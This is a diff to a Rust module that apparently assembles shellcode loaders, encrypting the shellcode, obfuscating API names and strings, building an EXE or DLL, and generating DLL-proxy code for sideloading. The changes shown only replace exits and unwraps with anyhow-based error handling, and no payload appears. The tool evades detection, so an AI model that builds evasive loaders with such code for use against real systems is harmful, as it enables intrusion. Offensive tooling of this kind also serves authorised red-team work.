@@ -5,12 +5,12 @@
 use crate::config::{Encryption, Execution, Format, Order};
 use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
 use crate::sandbox::build_sandbox;
+use anyhow::{Context, Result};
 use fs_extra::dir::{copy, CopyOptions};
 use std::collections::HashMap;
 use std::fs::{self, OpenOptions};
 use std::io::prelude::*;
 use std::path::{Path, PathBuf};
-use std::process::exit;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 const OUTPUT_DIR: &str = "shared";
@@ -24,33 +24,48 @@ fn build_dependencies(template_dependencies: Option<String>) -> String {
     }
 }
 
-fn search_and_replace(
-    path: &Path,
-    search: &str,
-    replace: &str,
-) -> Result<(), Box<dyn std::error::Error>> {
-    let content = fs::read_to_string(path)?;
+fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<()> {
+    let content = fs::read_to_string(path).with_context(|| {
+        format!(
+            "Failed to read template file for replacement: {}",
+            path.display()
+        )
+    })?;
     let new_content = content.replace(search, replace);
-    let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
-    file.write_all(new_content.as_bytes())?;
+    let mut file = OpenOptions::new()
+        .write(true)
+        .truncate(true)
+        .open(path)
+        .with_context(|| {
+            format!(
+                "Failed to open template file for writing: {}",
+                path.display()
+            )
+        })?;
+    file.write_all(new_content.as_bytes())
+        .with_context(|| format!("Failed to write replaced template file: {}", path.display()))?;
     Ok(())
 }
 
-fn create_output_folder() -> Result<PathBuf, Box<dyn std::error::Error>> {
-    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
+fn create_output_folder() -> Result<PathBuf> {
+    let timestamp = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .context("System clock before UNIX epoch")?
+        .as_secs();
     let folder_name = format!("output_{}", timestamp);
     println!("[+] Creating output folder: {}", folder_name);
     let path = Path::new(OUTPUT_DIR).join(folder_name);
-    fs::create_dir(&path)?;
+    fs::create_dir(&path)
+        .with_context(|| format!("Failed to create output folder: {}", path.display()))?;
     Ok(path)
 }
 
-fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
+fn copy_template(source: &Path, dest: &Path) -> Result<()> {
     let options = CopyOptions {
         content_only: true,
         ..Default::default()
     };
-    copy(source, dest, &options)?;
+    copy(source, dest, &options).context("Failed to copy template directory")?;
     Ok(())
 }
 
@@ -69,13 +84,14 @@ fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
 fn build_encrypted_output(
     order: &Order,
     src_dir: &Path,
-) -> (crate::encryption::EncryptionOutput, String) {
+) -> Result<(crate::encryption::EncryptionOutput, String)> {
     let filename = get_encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
     let include_path = format!("\"{}\"", filename);
     let output =
-        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption);
-    (output, include_path)
+        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption)
+            .context("Failed to encrypt shellcode")?;
+    Ok((output, include_path))
 }
 
 fn build_basic_replacements(
@@ -142,8 +158,8 @@ fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, Str
     );
 }
 
-fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
-    let (enc_output, include_path) = build_encrypted_output(order, src_dir);
+fn build_replacements(order: &Order, src_dir: &Path) -> Result<HashMap<&'static str, String>> {
+    let (enc_output, include_path) = build_encrypted_output(order, src_dir)?;
     let mut replacements = build_basic_replacements(enc_output, include_path);
     add_target_process_replacement(&mut replacements, &order.target_process);
 
@@ -156,7 +172,7 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
     }
 
     add_api_obfuscation_replacements(&mut replacements);
-    replacements
+    Ok(replacements)
 }
 
 fn build_dll_main_function(is_proxy: bool) -> String {
@@ -222,26 +238,33 @@ fn apply_dll_format(
     replacements: &mut HashMap<&'static str, String>,
     main_rs_path: &Path,
     is_proxy: bool,
-) -> PathBuf {
+) -> Result<PathBuf> {
     let dll_config = "\n[lib]\ncrate-type = [\"cdylib\"]";
     replacements.insert("{{DLL_FORMAT}}", dll_config.to_string());
     replacements.insert("{{DLL_MAIN}}", build_dll_main_function(is_proxy));
 
     let lib_rs_path = main_rs_path.with_file_name("lib.rs");
-    fs::rename(main_rs_path, &lib_rs_path).unwrap_or_else(|e| {
-        eprintln!("[-] Error renaming main.rs to lib.rs: {}", e);
-        exit(1);
-    });
-    lib_rs_path
+    fs::rename(main_rs_path, &lib_rs_path).with_context(|| {
+        format!(
+            "Failed to rename main.rs to lib.rs: {}",
+            main_rs_path.display()
+        )
+    })?;
+    Ok(lib_rs_path)
 }
 
-fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, cargo_path: &Path) {
+fn apply_replacements(
+    replacements: &HashMap<&str, String>,
+    main_path: &Path,
+    cargo_path: &Path,
+) -> Result<()> {
     for (key, value) in replacements {
-        let _ = search_and_replace(main_path, key, value)
-            .map_err(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
-        let _ = search_and_replace(cargo_path, key, value)
-            .map_err(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
+        search_and_replace(main_path, key, value)
+            .with_context(|| format!("Template replacement failed for key '{}'", key))?;
+        search_and_replace(cargo_path, key, value)
+            .with_context(|| format!("Cargo.toml replacement failed for key '{}'", key))?;
     }
+    Ok(())
 }
 
 fn find_proxy_insert_position(content: &str) -> usize {
@@ -264,12 +287,14 @@ fn find_proxy_insert_position(content: &str) -> usize {
         })
 }
 
-fn apply_proxy_config(order: &Order, folder: &Path) {
-    let proxy_path = order.proxy_dll.as_ref().unwrap();
-    let exports = crate::pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
-        eprintln!("[-] Failed to parse proxy DLL exports: {}", e);
-        exit(1);
-    });
+fn apply_proxy_config(order: &Order, folder: &Path) -> Result<()> {
+    let proxy_path = order
+        .proxy_dll
+        .as_ref()
+        .ok_or_else(|| anyhow::anyhow!("Proxy DLL path is None when applying proxy config"))?;
+    let exports = crate::pe_parser::parse_exports(proxy_path)
+        .map_err(anyhow::Error::msg)
+        .context("Failed to parse proxy DLL exports")?;
 
     if exports.is_empty() {
         eprintln!("[-] Warning: proxy DLL has no exports");
@@ -279,53 +304,57 @@ fn apply_proxy_config(order: &Order, folder: &Path) {
     let proxy_output = crate::dll_proxy::generate_proxy(&exports, &stem);
 
     let src_dir = folder.join("src");
-    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source).unwrap();
+    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
+        .context("Failed to write proxy.rs")?;
 
     let lib_rs_path = src_dir.join("lib.rs");
-    let content = fs::read_to_string(&lib_rs_path).unwrap();
+    let content = fs::read_to_string(&lib_rs_path)
+        .with_context(|| format!("Failed to read lib.rs: {}", lib_rs_path.display()))?;
     let insert_pos = find_proxy_insert_position(&content);
     let updated = format!(
         "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
         &content[..insert_pos],
         &content[insert_pos..]
     );
-    fs::write(&lib_rs_path, updated).unwrap();
+    fs::write(&lib_rs_path, updated)
+        .with_context(|| format!("Failed to write updated lib.rs: {}", lib_rs_path.display()))?;
 
     println!(
         "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
         exports.len(),
         proxy_output.original_dll_name
     );
+    Ok(())
 }
 
 /// Generate Rust loader code from order configuration
-pub fn assemble(order: Order) -> PathBuf {
+pub fn assemble(order: Order) -> Result<PathBuf> {
     println!("[+] Assembling Rust code..");
 
     let template_path = get_template_path(&order.execution);
-    let folder = create_output_folder().expect("Failed to create output folder");
-    copy_template(&template_path, &folder).expect("Failed to copy template");
+    let folder = create_output_folder()?;
+    copy_template(&template_path, &folder)?;
 
     let src_dir = folder.join("src");
     let main_rs = src_dir.join("main.rs");
     let cargo_toml = folder.join("Cargo.toml");
 
-    let mut replacements = build_replacements(&order, &src_dir);
+    let mut replacements = build_replacements(&order, &src_dir)?;
 
     let is_proxy = order.proxy_dll.is_some();
     let target_file = match order.format {
-        Format::Dll => apply_dll_format(&mut replacements, &main_rs, is_proxy),
+        Format::Dll => apply_dll_format(&mut replacements, &main_rs, is_proxy)?,
         Format::Exe => main_rs,
     };
 
-    apply_replacements(&replacements, &target_file, &cargo_toml);
+    apply_replacements(&replacements, &target_file, &cargo_toml)?;
 
     if is_proxy {
-        apply_proxy_config(&order, &folder);
+        apply_proxy_config(&order, &folder)?;
     }
 
     println!("[+] Done assembling Rust code!");
-    folder
+    Ok(folder)
 }
 
 #[cfg(test)]
